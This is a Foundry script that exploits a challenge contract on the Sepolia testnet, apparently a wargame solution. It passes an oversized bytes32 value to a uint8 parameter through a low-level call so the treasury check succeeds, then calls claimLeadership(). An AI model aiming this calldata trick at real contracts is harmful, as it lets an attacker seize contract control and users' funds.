// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {Script, console} from "forge-std/Script.sol";

interface HighOrder {
    function registerTreasury(uint8) external;

    function claimLeadership() external;
}

contract StakeScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address highOrder = 0xFaC091578429b46638438763A9F30eFD81E03239;

        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        highOrder.call(abi.encodeWithSignature("registerTreasury(uint8)", bytes32(uint256(100000))));

        highOrder.call(abi.encodeWithSignature("claimLeadership()"));

        vm.stopBroadcast();
    }
}
